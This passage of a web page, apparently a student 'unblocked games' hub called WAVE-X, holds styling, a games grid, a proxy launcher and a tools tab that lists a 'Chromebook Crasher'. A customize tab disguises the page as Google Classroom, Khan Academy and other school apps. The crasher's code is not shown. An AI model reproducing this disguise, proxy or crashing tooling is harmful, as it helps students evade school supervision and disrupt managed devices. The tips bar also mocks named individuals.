            width: 100%;
            height: 100%;
            background: linear-gradient(90deg,
                transparent,
                rgba(0, 255, 255, 0.1),
                rgba(0, 255, 255, 0.2),
                rgba(0, 255, 255, 0.1),
                transparent);
            transition: left 0.5s;
            z-index: 1;
        }

        .tool-card:hover::before {
            left: 100%;
        }

        .tool-card:hover {
            transform: translateY(-15px) scale(1.03);
            border-color: var(--hacker-green);
            box-shadow:
                0 0 35px rgba(0, 255, 65, 0.4),
                0 10px 30px rgba(0, 0, 0, 0.5),
                inset 0 0 0 1px rgba(0, 255, 65, 0.2);
        }

        .tool-card:active {
            transform: scale(0.97);
            transition: transform 0.1s;
        }

        .tool-card > * {
            position: relative;
            z-index: 2;
        }

        .tool-icon {
            font-size: 3.5rem;
            margin-bottom: 20px;
            display: block;
            filter: drop-shadow(0 0 10px var(--hacker-cyan));
            transition: transform 0.3s ease;
        }

        .tool-card:hover .tool-icon {
            transform: scale(1.1);
        }

        .tool-title {
            color: var(--hacker-cyan);
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 12px;
            text-shadow: 0 0 15px var(--hacker-cyan);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .tool-card:hover .tool-title {
            color: var(--hacker-green);
            text-shadow: 0 0 20px var(--hacker-green);
        }

        .tool-desc {
            color: var(--hacker-green);
            font-size: 14px;
            opacity: 0.9;
            line-height: 1.4;
        }

        .tool-card:hover .tool-desc {
            opacity: 1;
            color: var(--hacker-cyan);
        }

        /* Tips Bar at Bottom */
        .tips-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            height: 50px;
            background: linear-gradient(135deg,
                rgba(0, 0, 0, 0.95),
                rgba(10, 10, 10, 0.9),
                rgba(0, 0, 0, 0.95));
            border-top: 3px solid var(--hacker-green);
            box-shadow: 0 -5px 20px rgba(0, 255, 0, 0.3);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            backdrop-filter: blur(5px);
        }

        .tips-bar::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg,
                transparent,
                rgba(0, 255, 0, 0.1),
                transparent);
            animation: tipsScan 8s linear infinite;
        }

        .tips-text {
            color: var(--hacker-green);
            font-family: monospace;
            font-size: 16px;
            font-weight: bold;
            text-shadow: 0 0 10px var(--hacker-green);
            letter-spacing: 1px;
            white-space: nowrap;
            padding: 0 20px;
            position: relative;
            z-index: 1;
        }

        @keyframes tipsScan {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .games-page.show .tips-bar {
            position: fixed;
        }

        /* Threat Overlay Styles (Random Images) */
        .threat-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 20;
            display: none;
        }

        .threat-overlay.active {
            display: block;
        }

        .threat-image {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            height: 80%;
            background-size: contain;
            background-position: center;
            background-repeat: no-repeat;
            border: 3px solid #ff0000;
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.8);
            background-color: #000;
        }

        .threat-slices {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            height: 80%;
            display: flex;
            flex-direction: row;
        }

        .slice {
            flex: 1;
            height: 100%;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            transform-origin: center;
        }

        /* Slice Animation */
        .slice:nth-child(1) { animation: slice1 2s ease-out forwards; }
        .slice:nth-child(2) { animation: slice2 2s ease-out forwards; }
        .slice:nth-child(3) { animation: slice3 2s ease-out forwards; }
        .slice:nth-child(4) { animation: slice4 2s ease-out forwards; }
        .slice:nth-child(5) { animation: slice5 2s ease-out forwards; }
        .slice:nth-child(6) { animation: slice6 2s ease-out forwards; }
        .slice:nth-child(7) { animation: slice7 2s ease-out forwards; }
        .slice:nth-child(8) { animation: slice8 2s ease-out forwards; }
        .slice:nth-child(9) { animation: slice9 2s ease-out forwards; }
        .slice:nth-child(10) { animation: slice10 2s ease-out forwards; }

        /* Slice Animations */
        @keyframes slice1 { 0% { transform: translateX(0) rotate(0deg); opacity: 1; } 50% { opacity: 1; } 100% { transform: translateX(-200px) translateY(-100px) rotate(-30deg); opacity: 0; } }
        @keyframes slice2 { 0% { transform: translateX(0) rotate(0deg); opacity: 1; } 50% { opacity: 1; } 100% { transform: translateX(-150px) translateY(-50px) rotate(-20deg); opacity: 0; } }
        @keyframes slice3 { 0% { transform: translateX(0) rotate(0deg); opacity: 1; } 50% { opacity: 1; } 100% { transform: translateX(-100px) translateY(0) rotate(-10deg); opacity: 0; } }
        @keyframes slice4 { 0% { transform: translateX(0) rotate(0deg); opacity: 1; } 50% { opacity: 1; } 100% { transform: translateX(-50px) translateY(50px) rotate(10deg); opacity: 0; } }
        @keyframes slice5 { 0% { transform: translateX(0) rotate(0deg); opacity: 1; } 50% { opacity: 1; } 100% { transform: translateX(0) translateY(100px) rotate(20deg); opacity: 0; } }
        @keyframes slice6 { 0% { transform: translateX(0) rotate(0deg); opacity: 1; } 50% { opacity: 1; } 100% { transform: translateX(50px) translateY(50px) rotate(10deg); opacity: 0; } }
        @keyframes slice7 { 0% { transform: translateX(0) rotate(0deg); opacity: 1; } 50% { opacity: 1; } 100% { transform: translateX(100px) translateY(0) rotate(-10deg); opacity: 0; } }
        @keyframes slice8 { 0% { transform: translateX(0) rotate(0deg); opacity: 1; } 50% { opacity: 1; } 100% { transform: translateX(150px) translateY(-50px) rotate(-20deg); opacity: 0; } }
        @keyframes slice9 { 0% { transform: translateX(0) rotate(0deg); opacity: 1; } 50% { opacity: 1; } 100% { transform: translateX(200px) translateY(-100px) rotate(-30deg); opacity: 0; } }
        @keyframes slice10 { 0% { transform: translateX(0) rotate(0deg); opacity: 1; } 50% { opacity: 1; } 100% { transform: translateX(-50px) translateY(150px) rotate(45deg); opacity: 0; } }

        /* Threat flash effect */
        @keyframes threatFlash {
            0%, 100% { background-color: rgba(255, 0, 0, 0.1); }
            10%, 30%, 50%, 70%, 90% { background-color: rgba(255, 0, 0, 0.3); }
        }

        .threat-flash {
            animation: threatFlash 0.5s ease-in-out;
        }

        /* Game Iframe Overlay Styles */
        .game-iframe-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 5000;
            display: none;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .game-iframe-overlay.show {
            display: block;
            opacity: 1;
        }

        .game-iframe-container {
            position: absolute;
            top: 80px;
            left: 10px;
            right: 10px;
            bottom: 10px;
            background: #000;
            border: 4px solid #00ff00;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 0 50px rgba(0, 255, 0, 0.5);
        }

        .game-iframe-container.fullscreen {
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            border-radius: 0;
        }

        .game-iframe-header {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 50px;
            background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
            border-bottom: 3px solid #00ff00;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px;
            z-index: 10;
        }

        .game-iframe-container.fullscreen .game-iframe-header {
            display: none;
        }

        .game-iframe-title {
            color: #00ff00;
            font-size: 16px;
            font-family: monospace;
            text-shadow: 0 0 10px #00ff00;
        }

        .game-iframe-controls {
            display: flex;
            gap: 10px;
        }

        .game-iframe-btn {
            background: linear-gradient(135deg, #1a1a1a, #0a0a0a);
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 8px 15px;
            border-radius: 0;
            cursor: pointer;
            font-size: 14px;
            font-family: monospace;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s ease;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.4);
        }

        .game-iframe-btn:hover {
            background: linear-gradient(135deg, #00ff00, #00aa00);
            color: #000;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
        }

        .game-iframe {
            width: 100%;
            height: 100%;
            border: none;
            background: #000;
        }

        .game-iframe-container:not(.fullscreen) .game-iframe {
            margin-top: 50px;
        }

        .game-iframe-container.fullscreen .game-iframe {
            margin-top: 0;
        }
    </style>
</head>
<body>
    <!-- Modern Background Particles -->
    <div class="background-particles" id="backgroundParticles"></div>

    <!-- Game Iframe Overlay -->
    <div class="game-iframe-overlay" id="gameIframeOverlay">
        <div class="game-iframe-container" id="gameIframeContainer">
            <div class="game-iframe-header" id="gameIframeHeader">
                <div class="game-iframe-title" id="gameIframeTitle">Loading...</div>
                <div class="game-iframe-controls">
                    <button class="game-iframe-btn" id="gameFullscreenBtn">FULLSCREEN</button>
                    <button class="game-iframe-btn" id="gameResetBtn">RESET</button>
                    <button class="game-iframe-btn" id="gameCloseBtn">CLOSE</button>
                </div>
            </div>
            <iframe class="game-iframe" id="gameIframe" src="" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-pointer-lock allow-orientation-lock allow-presentation"></iframe>
        </div>
    </div>



    <!-- Tips Bar -->
    <div class="tips-bar" id="tipsBar">
        <div class="tips-text" id="tipsText">"maddy is a 6'7 leprechaun"  "evie and liesl are boyfriends"</div>
    </div>

    <!-- Games Page -->
    <div class="games-page" id="gamesPage">
        <!-- Tab Bar -->
        <div class="tab-bar">
            <div class="tab active" data-tab="games"> GAMES</div>
            <div class="tab" data-tab="proxy"> PROXY</div>
            <div class="tab" data-tab="tools"> TOOLS</div>
            <div class="tab" data-tab="customize"> CUSTOMIZE</div>
        </div>

        <!-- Games Tab Content -->
        <div class="tab-content active" id="games-tab">
            <div class="games-header">
                <p class="subtitle">execute /usr/games/run --all</p>
                <button class="dark-mode-toggle" id="darkModeToggle" onclick="toggleDarkMode()"> DARK MODE</button>
                <div class="search-container">
                    <input type="text" id="gameSearchInput" class="search-input" placeholder="Search games... (Ctrl+F)">
                    <button id="searchBtn" class="search-btn" onclick="searchGames()">SEARCH</button>
                </div>
                <div class="games-controls" id="gamesControls">
                    <button id="gamesSortAlpha" class="games-btn">Sort AZ</button>
                    <button id="gamesResetLayout" class="games-btn">Reset Layout</button>
                </div>
            </div>

            <div class="games-grid" id="gamesGrid">
                <!-- Game Cards will be populated by JavaScript -->
            </div>
        </div>

        <!-- Proxy Tab Content -->
        <div class="tab-content" id="proxy-tab">
            <div class="proxy-interface">
                <h1> WAVE-X PROXY NETWORK</h1>
                <div class="proxy-launch-section">
                    <button class="launch-proxy-btn" id="launchProxyBtn"> LAUNCH PROXY</button>
                    <div class="proxy-overlay-text" id="proxyOverlayText"></div>
                </div>
            </div>
        </div>

        <!-- Tools Tab Content -->
        <div class="tab-content" id="tools-tab">
                <div class="tools-interface">
                    <h1> WAVE-X DEV TOOLS</h1>
                    <div class="tools-grid">
                        <div class="tool-card" onclick="unlockDevTools()">
                            <div class="tool-icon"></div>
                            <div class="tool-title">Unlock Dev Tools</div>
                            <div class="tool-desc">Access advanced developer features</div>
                        </div>
                        <div class="tool-card" onclick="banYourself()">
                            <div class="tool-icon"></div>
                            <div class="tool-title">Ban</div>
                            <div class="tool-desc">Permanently ban this device - requires dev code</div>
                        </div>
                    <div class="tool-card" onclick="openChromebookCrasher()">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Chromebook Crasher</div>
                        <div class="tool-desc">System stress testing - HIGH RISK</div>
                    </div>
                    <div class="tool-card" onclick="openGame('https://storage.classroomsarecool.mex.com/soundboard/index.html', 'Soundboard')">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Soundboard</div>
                        <div class="tool-desc">Audio clips and sound effects</div>
                    </div>
                    <div class="tool-card" onclick="openGame('https://storage.classroomsarecool.mex.com/fake-virus/index.html', 'Fake Virus')">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Fake Virus</div>
                        <div class="tool-desc">Joke virus simulation tool</div>
                    </div>

                </div>
            </div>
        </div>

        <!-- Customize Tab Content -->
        <div class="tab-content" id="customize-tab">
            <div class="tools-interface">
                <h1> WAVE-X CUSTOMIZE</h1>
                <div style="text-align: center; margin-bottom: 30px;">
                    <div class="tool-desc" style="color: var(--hacker-green); font-size: 16px;">
                        Disguise this page as your favorite educational apps with authentic branding
                    </div>
                </div>

                <!-- Educational App Presets -->
                <div class="tools-grid" style="margin-bottom: 40px;">
                    <div class="tool-card" onclick="setEducationalPreset('Google Classroom', 'https://ssl.gstatic.com/classroom/ic_product_classroom_144.png', '#E8710A')">
                        <div class="tool-icon" style="background-image: url('https://ssl.gstatic.com/classroom/ic_product_classroom_144.png'); background-size: contain;"></div>
                        <div class="tool-title">Google Classroom</div>
                        <div class="tool-desc">Primary assignment platform with gradebook</div>
                    </div>
                    <div class="tool-card" onclick="setEducationalPreset('Google Docs', 'https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico', '#4285F4')">
                        <div class="tool-icon" style="background-image: url('https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico'); background-size: contain;"></div>
                        <div class="tool-title">Google Docs</div>
                        <div class="tool-desc">Document editing workspace</div>
                    </div>
                    <div class="tool-card" onclick="setEducationalPreset('Google Drive', 'https://ssl.gstatic.com/images/branding/product/2x/drive_2020q4_48dp.png', '#188038')">
                        <div class="tool-icon" style="background-image: url('https://ssl.gstatic.com/images/branding/product/2x/drive_2020q4_48dp.png'); background-size: contain;"></div>
                        <div class="tool-title">Google Drive</div>
                        <div class="tool-desc">File storage and organization</div>
                    </div>
                    <div class="tool-card" onclick="setEducationalPreset('Khan Academy', 'https://cdn.kastatic.org/images/apple-touch-icon-72x72-precomposed.new.png', '#14B866')">
                        <div class="tool-icon" style="background-image: url('https://cdn.kastatic.org/images/apple-touch-icon-72x72-precomposed.new.png'); background-size: contain;"></div>
                        <div class="tool-title">Khan Academy</div>
                        <div class="tool-desc">Free online courses, lessons & practice</div>
                    </div>
                    <div class="tool-card" onclick="setEducationalPreset('IXL Math', 'https://www.ixl.com/favicon.ico', '#2188FF')">
                        <div class="tool-icon" style="background-image: url('https://www.ixl.com/favicon.ico'); background-size: contain;"></div>
                        <div class="tool-title">IXL Math</div>
                        <div class="tool-desc">Mathematics practice tool with adaptive learning</div>
                    </div>
                    <div class="tool-card" onclick="setEducationalPreset('Duolingo', 'https://d35aaqx5ub95lt.cloudfront.net/favicon.ico', '#78C800')">
                        <div class="tool-icon" style="background-image: url('https://d35aaqx5ub95lt.cloudfront.net/favicon.ico'); background-size: contain;"></div>
                        <div class="tool-title">Duolingo</div>
                        <div class="tool-desc">Language learning platform</div>
                    </div>
                    <div class="tool-card" onclick="setEducationalPreset('Canvas LMS', 'https://du11hjcvx0uqb.cloudfront.net/dist/images/canvas-logo-single-mark-only-white-200x200.png', '#E7242A')">
                        <div class="tool-icon" style="background-image: url('https://du11hjcvx0uqb.cloudfront.net/dist/images/canvas-logo-single-mark-only-white-200x200.png'); background-size: contain;"></div>
                        <div class="tool-title">Canvas LMS</div>
                        <div class="tool-desc">Learning management system</div>
                    </div>
                    <div class="tool-card" onclick="setEducationalPreset('Moodle', 'https://moodle.org/theme/moodleorg/pix/favicon.ico', '#F98012')">
                        <div class="tool-icon" style="background-image: url('https://moodle.org/theme/moodleorg/pix/favicon.ico'); background-size: contain;"></div>
                        <div class="tool-title">Moodle</div>
                        <div class="tool-desc">Open-source learning platform</div>
                    </div>
                    <div class="tool-card" onclick="setEducationalPreset('Quizlet', 'https://assets.quizlet.com/a/j/dist/app/534.0a8b0b1990c2e4b/favicon.ico', '#4257B2')">
                        <div class="tool-icon" style="background-image: url('https://assets.quizlet.com/a/j/dist/app/534.0a8b0b1990c2e4b/favicon.ico'); background-size: contain;"></div>
                        <div class="tool-title">Quizlet</div>
                        <div class="tool-desc">Flashcards and study tools</div>
                    </div>
                    <div class="tool-card" onclick="setEducationalPreset('BrainPOP', 'https://www.brainpop.com/wp-content/themes/brainpop/images/favicon.ico', '#FF6B00')">
                        <div class="tool-icon" style="background-image: url('https://www.brainpop.com/wp-content/themes/brainpop/images/favicon.ico'); background-size: contain;"></div>
                        <div class="tool-title">BrainPOP</div>
                        <div class="tool-desc">Animated educational movies</div>
                    </div>
                    <div class="tool-card" onclick="setEducationalPreset('NoRedInk', 'https://www.noredink.com/favicon.ico', '#FF4757')">
                        <div class="tool-icon" style="background-image: url('https://www.noredink.com/favicon.ico'); background-size: contain;"></div>
                        <div class="tool-title">NoRedInk</div>
                        <div class="tool-desc">Grammar and writing practice</div>
                    </div>
                    <div class="tool-card" onclick="setEducationalPreset('Khan Academy Kids', 'https://cdn.kastatic.org/images/apple-touch-icon-72x72-precomposed.new.png', '#FFB74D')">
                        <div class="tool-icon" style="background-image: url('https://cdn.kastatic.org/images/apple-touch-icon-72x72-precomposed.new.png'); background-size: contain;"></div>
                        <div class="tool-title">Khan Academy Kids</div>
                        <div class="tool-desc">Learning app for young children</div>
                    </div>

                    <!-- Individual Customization Tool Cards -->
                    <div class="tool-card" onclick="showThemeCustomizer()">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Theme Customizer</div>
                        <div class="tool-desc">Customize colors and themes</div>
                    </div>
                    <div class="tool-card" onclick="showBackgroundPicker()">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Background Effects</div>
                        <div class="tool-desc">Choose background animations</div>
                    </div>
                    <div class="tool-card" onclick="showFontCustomizer()">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Font Styles</div>
                        <div class="tool-desc">Change text fonts and sizes</div>
                    </div>
                    <div class="tool-card" onclick="showAudioCustomizer()">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Audio Effects</div>
                        <div class="tool-desc">Background sounds and effects</div>
                    </div>
                    <div class="tool-card" onclick="showPresetThemes()">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Preset Themes</div>
                        <div class="tool-desc">Pre-made theme packs</div>
                    </div>
                    <div class="tool-card" onclick="showAnimationTuner()">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Animation Tuner</div>
                        <div class="tool-desc">Control animation speeds</div>
                    </div>
                    <div class="tool-card" onclick="setCustomTitles()">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Custom Title</div>
                        <div class="tool-desc">Set your own page title</div>
                    </div>
                    <div class="tool-card" onclick="changeFavicon()">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Custom Favicon</div>
                        <div class="tool-desc">Upload or generate favicon</div>
                    </div>
                    <div class="tool-card" onclick="exportCustomizations()">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Export Settings</div>
                        <div class="tool-desc">Save theme as file</div>
                    </div>
                    <div class="tool-card" onclick="importCustomizations()">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Import Settings</div>
                        <div class="tool-desc">Load saved theme</div>
                    </div>
                    <div class="tool-card" onclick="resetToOriginal()">
                        <div class="tool-icon"></div>
                        <div class="tool-title">Reset to Original</div>
                        <div class="tool-desc">Remove all customizations</div>
                    </div>
                </div>

                <!-- Customization Status -->
                <div style="margin-top: 40px;">
                    <div style="background: rgba(0,0,0,0.8); border: 2px solid var(--hacker-cyan); border-radius: 15px; padding: 20px; text-align: center;">
                        <div style="color: var(--hacker-cyan); font-size: 18px; font-weight: bold; margin-bottom: 15px;">
                             Customization Status
                        </div>
                        <div id="customizeStatus" style="color: var(--hacker-green); font-family: monospace; font-size: 14px;">
                             Current Title: <span id="currentTitle">Loading...</span><br>
                             Current Theme: <span id="currentTheme">Default Hacker</span><br>
                             Current Favicon: Default WAVE-X icon<br>
                             Camouflage Mode: <span id="camouflageMode">OFF</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        class HackerTerminal {
            constructor() {
                this.textElement = document.getElementById('typedText');
                this.progressFill = document.getElementById('progressFill');
                this.matrixRain = document.getElementById('matrixRain');
                this.terminal = document.getElementById('mainTerminal');
                this.securityLevel = document.getElementById('securityLevel');

                this.currentPhase = 0;
                this.matrixChars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()';
                this.init();
            }

            init() {
                // Start matrix rain
                this.createMatrixRain();

                // Security level randomization
                this.randomizeSecurityLevel();

                // Start the typing sequence
                setTimeout(() => this.startSequence(), 1000);
            }

            createMatrixRain() {
                // Create only 3 meaningful code streams instead of random gibberish
                const streams = 3;
                const codeLines = [
                    'sudo launch wave-x',
                    'chmod +x /usr/games',
                    'execute --all --now'
                ];

                for (let i = 0; i < streams; i++) {
                    setTimeout(() => {
                        this.createCodeStream(Math.random() * window.innerWidth, codeLines[i % codeLines.length]);
                    }, i * 1000);
                }
            }

            createCodeStream(x, codeLine) {
                const stream = document.createElement('div');
                stream.className = 'matrix-char';
                stream.style.left = x + 'px';
                stream.style.fontSize = '16px';
                stream.textContent = codeLine;

                this.matrixRain.appendChild(stream);

                const fallSpeed = 1.5;
                let y = -stream.offsetHeight;

                const animate = () => {
                    y += fallSpeed;
                    stream.style.top = y + 'px';

                    if (y > window.innerHeight) {
                        y = -stream.offsetHeight;
                    }

                    requestAnimationFrame(animate);
                };
                animate();

                // Recreate the stream after it falls off screen
                setTimeout(() => {
                    stream.remove();
                    this.createCodeStream(Math.random() * window.innerWidth, codeLine);
                }, 15000);
            }

            randomizeSecurityLevel() {
                const levels = ['MINIMUM', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL', 'MAXIMUM'];
                setInterval(() => {
                    this.securityLevel.textContent = `SECURITY LEVEL: ${levels[Math.floor(Math.random() * levels.length)]}`;
                }, 100);
            }

            async typeText(text, element, delay = 15) {
                return new Promise(resolve => {
                    let i = 0;
                    const typeInterval = setInterval(() => {
                        element.textContent += text[i];
                        i++;

                        // Add cursor blink effect
                        if (text.includes('') || Math.random() > 0.6) {
                            element.innerHTML = element.textContent.replace(//, '<span class="cursor"></span>');
                        }

                        if (i >= text.length) {
                            clearInterval(typeInterval);
                            resolve();
                        }
                    }, delay);
                });
            }

            async backspaceText(element, charsToDelete, delay = 50) {
                return new Promise(resolve => {
                    let deleteCount = 0;
                    const backspaceInterval = setInterval(() => {
                        if (element.textContent.length > 0) {
                            // Remove the last character from the element's content
                            element.textContent = element.textContent.slice(0, -1);
                            deleteCount++;

                            // Add cursor effect
                            element.innerHTML = element.textContent + '<span class="cursor"></span>';
                        }

                        if (deleteCount >= charsToDelete) {
                            clearInterval(backspaceInterval);
                            resolve();
                        }
                    }, delay);
                });
            }

            async startSequence() {
                // Wait for terminal to appear with dramatic pause
                await this.sleep(1000);

                // System initialization with delays for visibility
                await this.typeText('>> SYSTEM BOOT SEQUENCE INITIATED <<\n\n', this.textElement, 50);
                await this.sleep(500);

                await this.typeText('[INIT] Loading WAVE-X kernel modules...\n', this.textElement, 30);
                await this.sleep(800);

                await this.typeText('[INIT] Scanning hardware compatibility...\n', this.textElement, 30);
                await this.sleep(600);

                await this.typeText('[SUCCESS] GPU acceleration detected \n', this.textElement, 25);
                await this.sleep(400);

                await this.typeText('[SUCCESS] Network interfaces configured \n', this.textElement, 25);
                await this.sleep(400);

                await this.typeText('[SUCCESS] Security protocols loaded \n\n', this.textElement, 25);
                await this.sleep(800);

                // Dramatic password sequence
                await this.typeText('ACCESS REQUIRED: Enter administrator credentials\n\n', this.textElement, 35);
                await this.sleep(600);

                await this.typeText('> sudo wave-x --root-access --unrestricted\n', this.textElement, 40);
                await this.sleep(500);

                await this.typeText('Password: ', this.textElement, 50);
                await this.sleep(300);

                await this.typeText('********\n\n', this.textElement, 100);
                await this.sleep(800);

                await this.typeText('[AUTH] Verifying credentials...\n', this.textElement, 45);
                await this.sleep(1500);

                await this.typeText('[AUTH] Root access GRANTED\n\n', this.textElement, 50);
                await this.sleep(800);

                await this.typeText(' WELCOME TO WAVE-X TERMINAL \n\n', this.textElement, 60);
                await this.sleep(1000);

                await this.typeText('> Initializing game database...\n> Loading proxy networks...\n> Activating virtual environments...\n\n', this.textElement, 35);
                await this.sleep(1200);

                await this.typeText('[READY] All systems operational\n', this.textElement, 40);
                await this.sleep(500);

                await this.typeText('[LAUNCH] Opening WAVE-X Gaming Hub...\n\n', this.textElement, 45);
                await this.sleep(1500);

                // Dramatic finale
                await this.typeText(' 100%\n', this.textElement, 80);
                await this.sleep(1000);

                // Final transition with longer delay
                setTimeout(() => {
                    this.transitionToGames();
                }, 2500);
            }

            async dramaticTyping(text) {
                const chars = text.split('');
                for (const char of chars) {
                    // Add dramatic effects on certain characters
                    if (char === ' ') {
                        this.textElement.innerHTML += char;
                        await this.sleep(100);
                    } else {
                        // Create glitch effect on special characters
                        if (char === '-' || char === '1' || char === '2' || char === '4') {
                            this.terminal.classList.add('glitch-effect');
                            await this.sleep(50);
                        }

                        this.textElement.innerHTML += char;

                        // Add random delay for dramatic effect
                        const delay = Math.random() * 100 + 50;

                        // Visual feedback
                        this.terminal.style.boxShadow = `0 0 ${Math.random() * 100 + 50}px rgba(0,255,65,0.7)`;

                        await this.sleep(delay);

                        // Reset effects
                        if (char === '-' || char === '1' || char === '2' || char === '4') {
                            this.terminal.classList.remove('glitch-effect');
                        }
                        this.terminal.style.boxShadow = '0 0 50px rgba(0, 255, 255, 0.3)';
                    }
                }
            }

            sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

            transitionToGames() {
                // Hide terminal and show games page
                this.terminal.style.opacity = '0';
                setTimeout(() => {
                    this.terminal.style.display = 'none';
                    const gamesPage = document.getElementById('gamesPage');
                    gamesPage.classList.add('show');
                    document.body.style.overflow = 'auto'; // Allow scrolling on games page
                    initializeGamesPage();
                }, 1000);
            }
        }

        // Modern Welcome System
        class ModernWelcome {
            constructor() {
                this.welcomePanel = document.getElementById('welcomePanel');
                this.welcomeMessage = document.getElementById('welcomeMessage');
                this.particlesContainer = document.getElementById('backgroundParticles');

                this.currentPhase = 0;
                this.messages = [
                    'Initializing system...',
                    'Loading WAVE-X modules...',
                    'Establishing secure connection...',
                    'System ready for operation'
                ];

                this.init();
            }

            init() {
                // Start background particles
                this.createParticles();

                // Start welcome sequence
                this.startSequence();
            }

            createParticles() {
                for (let i = 0; i < 50; i++) {
                    const particle = document.createElement('div');
                    particle.className = 'particle';
                    particle.style.left = Math.random() * 100 + '%';
                    particle.style.animationDelay = Math.random() * 20 + 's';
                    particle.style.width = Math.random() * 4 + 2 + 'px';
                    particle.style.height = particle.style.width;
                    this.particlesContainer.appendChild(particle);
                }
            }

            async startSequence() {
                // Show welcome panel with animation
                setTimeout(() => {
                    this.welcomePanel.style.opacity = '1';
                    this.welcomePanel.style.transform = 'translate(-50%, -50%) scale(1)';
                }, 500);

                // Cycle through messages
                for (let i = 0; i < this.messages.length; i++) {
                    this.welcomeMessage.textContent = this.messages[i];
                    await this.sleep(800);

                    // Add pulsing effect on certain messages
                    if (i === 2) {
                        this.welcomePanel.style.animation = 'pulse 1s ease-in-out';
                        setTimeout(() => this.welcomePanel.style.animation = '', 1000);
                    }
                }

                // Transition to games page
                setTimeout(() => {
                    this.transitionToGames();
                }, 1500);
            }

            transitionToGames() {
                // Fade out welcome panel
                this.welcomePanel.style.opacity = '0';
                this.welcomePanel.style.transform = 'translate(-50%, -50%) scale(0.9)';

                // Show games page
                setTimeout(() => {
                    this.welcomePanel.style.display = 'none';
                    const gamesPage = document.getElementById('gamesPage');
                    gamesPage.classList.add('show');
                    document.body.style.overflow = 'auto';
                    initializeGamesPage();
                }, 1000);
            }

            sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }
        }

        // Initialize when DOM loads
        document.addEventListener('DOMContentLoaded', () => {
            // CHECK FOR BAN FIRST - This must happen immediately before anything else
            if (checkForBan()) {
                return; // If banned, don't load anything else
            }

            const gamesPage = document.getElementById('gamesPage');
            gamesPage.classList.add('show');
            document.body.style.overflow = 'auto'; // Allow scrolling on games page
            initializeGamesPage();
            initializeTabs();

            // Start tips cycler
            new TipsCycler();

            // Start threat injector after short delay
            setTimeout(() => {
                new ThreatInjector();
            }, 5000);
        });

        // Games Page Functionality - DUPLICATES CLEANED UP (~60 games)
        // FEATURES: Favorites, Recent Games, Categories, Search, Dark Mode, Launch Stats

        // Games Storage & Analytics
        let userFavorites = JSON.parse(localStorage.getItem('waveX_favorites') || '[]');
        let recentGames = JSON.parse(localStorage.getItem('waveX_recent') || '[]');
        let gameLaunchStats = JSON.parse(localStorage.getItem('waveX_stats') || '{}');
        let gameCategories = {
            'Action': ['Moto X3M', 'Moto X3M 3', 'Moto X3M Spooky', 'Moto X3M Winter', 'Moto X3M Pool Party', 'Turbo Moto Racer', 'Skibidi Strike', 'Pixel Shooter', 'Fruit Ninja'],
            'Racing': ['Snow Rider 3D', 'Highway Rider Extreme', 'Drift Hunters', 'Crazy Cars', 'Mr Racer', 'Arcade Car Drift', 'Race Survival', 'Slow Roads'],
            'Multiplayer': ['1v1.lol', '2D Rocket League', 'Rocket Soccer Derby', 'Paper.io 2', 'Hole.io', 'Slope.io', 'Subway Surfers', 'Basketball Stars'],
            'Puzzle': ['Block Blast', 'A Dance of Fire and Ice', 'Tomb of the Mask', 'Cut the Rope: Time Travel', 'Cluster Rush'],
            'Platform': ['G-Switch 3', 'Vex 3', 'Doodle Jump', 'Geometry Dash Lite', 'Super Mario 64'],
            'Retro': ['Pac-Man', 'Super Hot', 'Google Snake', 'Chess'],
            'Simulation': ['BitLife', 'Retro Bowl', 'Cell Machine', 'Bad Time Simulator', 'Tanuki Sunset'],
            'Horror': ['Backrooms', 'Baldi\'s Basics', 'Deadly Decent'],
            'Music': ['A Dance of Fire and Ice'],
            'Runner': ['Minecraft Parkour', 'Crossy Road', 'Slope.io'],
            'Casual': ['Eggy Car', 'Death Run 3D', 'Jetpack Joyride'],
